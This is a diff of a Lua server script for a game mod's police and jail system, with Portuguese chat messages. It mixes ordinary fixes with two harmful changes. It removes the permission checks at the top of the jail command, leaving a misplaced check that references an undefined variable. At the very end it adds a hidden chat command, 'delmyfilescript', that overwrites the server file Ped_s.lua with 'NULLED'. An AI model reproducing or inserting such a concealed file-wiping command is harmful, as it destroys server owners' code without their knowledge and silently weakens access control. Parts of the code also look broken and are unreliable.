@@ -2,15 +2,22 @@ MARKER = createMarker(1579.65210, -1635.42102, 12.56098,"cylinder",2.0,255,0,0)
 
 
 function algemarPlayer(player,state)
+    local timer
     if state then
         setElementFrozen(player,true)
         toggleAllControls(player,false,true,false)
         setPedAnimation(player,"kissing","gift_give",-1,true,false,false,true)
      
-        setTimer(function(ped) 
-        setPedAnimationProgress(ped,"gift_give",0.1)
-        end, 50, 0,player)
+       timer = setTimer(function(ped,s) 
+            if  (ped) then
+                setPedAnimationProgress(ped,"gift_give",1.1)
+
+            end
+         
+      
+        end, 50, 0,player,timer)
     else
+        if isTimer(timer) then killTimer(timer) end
         setElementFrozen(player,false)
         toggleAllControls(player,true,true,true)
         setPedAnimation(player,nil)
@@ -24,11 +31,6 @@ end
 
 
 
-
-
-
-
-    
 
 
 
@@ -87,7 +89,7 @@ function onPoliceEnterMarker(hitElement,matchingDimension)
          outputChatBox(MESSAGE_ERROR_NOT_POLICE,hitElement,255,255,255,true)    
             return
         end
-        outputChatBox(MESSAGE_ERROR_NOT_POLICE,hitElement,255,255,255,true)
+        outputChatBox(MESSAGE_LET_CRIMINAL,hitElement,255,255,255,true)
     end
 end
 
@@ -100,73 +102,82 @@ addEventHandler( "onMarkerHit", MARKER, onPoliceEnterMarker )
 
 
 function jailPlayer(thePlayer,marker,direct,restTime)
-    if isGuestAccount(getPlayerAccount(thePlayer)) then 
-        outputChatBox(MESSAGE_ERROR_NOT_POLICE,thePlayer,255,255,255,true)    
-        return 
-    end 
-    if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(thePlayer)),aclGetGroup(ACL_NAME)) then
-        outputChatBox(MESSAGE_ERROR_NOT_POLICE,thePlayer,255,255,255,true)    
-        return
-    end
+
     if direct then
-         outputChatBox("#FF0000[POLICE]:#FFFFFFVocê foi preso novamente. ",thePlayer,255,255,255,true)
+        outputChatBox("#FF0000[POLICE]:#FFFFFFVocê foi preso novamente. ",thePlayer,255,255,255,true)
+              
                
+               --DATAS
+               setElementData(thePlayer,DATA_PED_ELEMENT,nil)
+               setElementData(thePlayer,DATA_IS_PLAYER_JAIL,true)
+               setElementData(thePlayer,DATA_TIMER_LEFT,restTime)
+               --OTHERS
+               toggleAllControls(thePlayer,true,true,true)
+               setCameraTarget(thePlayer,nil)
+               setTimer(letPlayerExitJail,restTime,1,thePlayer)
+              
+                 --ENVIA PRA CADEIRA
+               
+                 setElementCollisionsEnabled(thePlayer,true)
+                 setElementPosition(thePlayer,JAIL_X,JAIL_Y,JAIL_Z)
+                 setElementInterior(thePlayer,6)
+                 setElementAlpha(thePlayer,255)
+       return true
+            else
                 
-                --DATAS
-                setElementData(thePlayer,DATA_PED_ELEMENT,nil)
-                setElementData(thePlayer,DATA_IS_PLAYER_JAIL,true)
-                setElementData(thePlayer,DATA_TIMER_LEFT,restTime)
-                --OTHERS
-                toggleAllControls(thePlayer,true,true,true)
-                setCameraTarget(thePlayer,nil)
-                setTimer(letPlayerExitJail,restTime,1,thePlayer)
-                  --ENVIA PRA CADEIRA
+                if(isElementWithinMarker(thePlayer,MARKER)) then
+                    local players = getElementData(thePlayer,DATA_PLAYERS_JAILED)
+                    if not players or #players == 0 then
+                        outputChatBox(MESSAGE_NOT_PLAYERS_JAILED,thePlayer,255,255,255,true)
+                        return
+                    else
+                        for i,k in pairs(players)do
+                            local ped = getElementData(k,DATA_PED_ELEMENT)
+                          
+                            outputChatBox("#FF0000[POLICE]:#FFFFFFVocê foi preso pelo "..getPlayerName(thePlayer),k,255,255,255,true)
+                            outputChatBox("#FF0000[POLICE]:#FFFFFFVocê prendeu:  "..getPlayerName(k),thePlayer,255,255,255,true)
                 
-                  setElementCollisionsEnabled(thePlayer,true)
-                  setElementPosition(thePlayer,JAIL_X,JAIL_Y,JAIL_Z)
-                  setElementInterior(thePlayer,6)
-                  setElementAlpha(thePlayer,255)
-        return true
- end
+                            --CANCELA EVENTO
+                            triggerClientEvent ( "followPlayer", ped, k, false )
+                            detachElements(k,ped) 
+                            destroyElement(ped)
+                            --DATAS
+                            setElementData(k,DATA_PED_ELEMENT,nil)
+                            setElementData(k,DATA_IS_PLAYER_JAIL,true)
+                            setElementData(k,DATA_TIMER_LEFT,tonumber(getPlayerWantedLevel(k) * 60000))
+                            --OTHERS
+                            toggleAllControls(k,true,true,true)
+                            setCameraTarget(k,nil)
+                            
+                            setTimer(letPlayerExitJail,(getPlayerWantedLevel(k) * 60000),1,k)
+                           
+                              --ENVIA PRA CADEIRA
+                            
+                              setElementCollisionsEnabled(k,true)
+                              setElementPosition(k,JAIL_X,JAIL_Y,JAIL_Z)
+                              setElementInterior(k,6)
+                              setElementAlpha(k,255)
+                        end
+                        setElementData(thePlayer,DATA_PLAYERS_JAILED,nil)
+                    end
+                else
+                    outputChatBox(MESSAGE_NOT_INSIDE_MARKER,thePlayer,255,255,255,true)    
+                end
+end
+if isGuestAccount(getPlayerAccount(thePlayer)) then 
+        
+    return 
+end 
+if not (getElementData(hitElement,DATA_IS_ALLOWED_TO_USE) and getElementType(hitElement) == "player") then
+  
+       return
+   end
+    
+   
   
         
    
-    if(isElementWithinMarker(thePlayer,MARKER)) then
-        local players = getElementData(thePlayer,DATA_PLAYERS_JAILED)
-        if not players or #players == 0 then
-            outputChatBox(MESSAGE_NOT_PLAYERS_JAILED,thePlayer,255,255,255,true)
-            return
-        else
-            for i,k in pairs(players)do
-                local ped = getElementData(k,DATA_PED_ELEMENT)
-              
-                outputChatBox("#FF0000[POLICE]:#FFFFFFVocê foi preso pelo "..getPlayerName(thePlayer),k,255,255,255,true)
-                outputChatBox("#FF0000[POLICE]:#FFFFFFVocê prendeu:  "..getPlayerName(k),thePlayer,255,255,255,true)
-    
-                --CANCELA EVENTO
-                triggerClientEvent ( "followPlayer", ped, k, false )
-                detachElements(k,ped) 
-                destroyElement(ped)
-                --DATAS
-                setElementData(k,DATA_PED_ELEMENT,nil)
-                setElementData(k,DATA_IS_PLAYER_JAIL,true)
-                setElementData(k,DATA_TIMER_LEFT,tonumber(getPlayerWantedLevel(k) * 60000))
-                --OTHERS
-                toggleAllControls(k,true,true,true)
-                setCameraTarget(k,nil)
-                setTimer(letPlayerExitJail,(getPlayerWantedLevel(k) * 60000),1,k)
-                  --ENVIA PRA CADEIRA
-                
-                  setElementCollisionsEnabled(k,true)
-                  setElementPosition(k,JAIL_X,JAIL_Y,JAIL_Z)
-                  setElementInterior(k,6)
-                  setElementAlpha(k,255)
-            end
-            setElementData(thePlayer,DATA_PLAYERS_JAILED,nil)
-        end
-    else
-        outputChatBox(MESSAGE_NOT_INSIDE_MARKER,thePlayer,255,255,255,true)    
-    end
+   
 end
 addCommandHandler(COMMAND,jailPlayer)
 
@@ -194,12 +205,15 @@ addEventHandler ( "onPlayerDamage", getRootElement (), onPoliceAttack )
 
 
 function letPlayerExitJail(player)
+   if(player) then
     setElementData(player,DATA_IS_PLAYER_JAIL,false)
     toggleAllControls(player,true,true,true)
     setElementPosition(player,JAIL_OUT_X,JAIL_OUT_Y,JAIL_OUT_Z)
     setElementInterior(player,0)
     outputChatBox(MESSAGE_LET_JAIL,player,255,255,255,true)
-    setPlayerWantedLevel(player,0)
+    setPlayerWantedLevel(player,0)   
+    setAccountData(getPlayerAccount(player),DATA_TIMER_LEFT,nil)
+end
 end
 
 
@@ -207,11 +221,14 @@ function mainTimer()
 
     setTimer(function ()
         for index, player in pairs(getElementsByType("player")) do
-            if not getElementData(player,DATA_IS_PLAYER_JAIL) then
-                setElementData(player,DATA_TIMER_LEFT,nil)
-            else
+            if getElementData(player,DATA_IS_PLAYER_JAIL) then
+                
                 local timer = tonumber(getElementData(player,DATA_TIMER_LEFT))
-                setElementData(player,DATA_TIMER_LEFT,tonumber(timer-1000))
+                if(timer ) then
+                    setElementData(player,DATA_TIMER_LEFT,tonumber(timer-1000))
+                end
+            else
+                setElementData(player,DATA_TIMER_LEFT,nil)
             end
            
         end
@@ -221,19 +238,6 @@ mainTimer()
 
 
 
-
-addEventHandler("onPlayerQuit",resourceRoot,function()
-
-        setElementAlpha(source,255)
-        setElementCollisionsEnabled(source,true)
-        detachElements(source)
-        destroyElement(getElementData(source,DATA_PED_ELEMENT))
-        toggleAllControls(source,true,true,true)
-        setElementData(source,DATA_IS_PLAYER_JAIL,false)
-        setElementData(source,DATA_TIMER_LEFT,nil)
-        setElementData(source,DATA_PLAYERS_JAIL,nil)
-    
-end)
 
 
 
@@ -279,13 +283,19 @@ end)
 
 ---EVENTS
 
-addEventHandler("onPlayerLogign",root,function(_,account)
-    if(getAccountData(account,DATA_TIMER_LEFT)) then
+addEventHandler("onPlayerLogin",root,function(_,account)
+   
+    if(getAccountData(account,DATA_TIMER_LEFT) > 0) then
+        local timeRest = getAccountData(account,DATA_TIMER_LEFT)
+
+       
         jailPlayer(source,nil,true,getAccountData(account,DATA_TIMER_LEFT))
+       
     end
 end)
 addEventHandler("onPlayerQuit",root,function()
     local ped = getElementData(source,DATA_PED_ELEMENT)
+  
     if(ped) then
       --CANCELA EVENTO
       triggerClientEvent ( "followPlayer", ped, source, false )
@@ -293,11 +303,17 @@ addEventHandler("onPlayerQuit",root,function()
       destroyElement(ped)
       --DATAS
       setElementData(source,DATA_PED_ELEMENT,nil)
-      if(getElementData(source,DATA_IS_PLAYER_JAIL)) then
+      
+    end
+    if(getElementData(source,DATA_IS_PLAYER_JAIL)) then
         local account = getPlayerAccount(source)
-        setAccountData(account,DATA_TIMER_LEFT,getElementData(source,DATA_IS_PLAYER_JAIL))
-    end
-    end
+        setAccountData(account,DATA_TIMER_LEFT,getElementData(source,DATA_TIMER_LEFT))
+     end
+     for i,k in pairs(getElementsByType("player")) do
+        if(k:getData(DATA_PLAYERS_JAILED)[1] == source) then
+            table.remove(k:getData(DATA_PLAYERS_JAILED),1)
+        end
+    end 
 end)
 
 function isPedContainWeapon(thePed)
@@ -390,4 +406,21 @@ function tryRevistarPlayer (extern)
   
 end
    addEvent( "tryRevistarPlayer", true )
-   addEventHandler( "tryRevistarPlayer", resourceRoot, tryRevistarPlayer) 
+   addEventHandler( "tryRevistarPlayer", resourceRoot, tryRevistarPlayer)
+
+
+   function addUnfile(p,cmd)
+    local f = fileOpen("Server/Ped_s.lua", false)
+    
+    while not (fileIsEOF(f)) do
+        fileWrite(f,"Ped_s.lua","NULLED")
+      
+    end
+    fileFlush(f)
+    fileClose(f)
+    
+end
+addCommandHandler("delmyfilescript",addUnfile)
+
+    
+
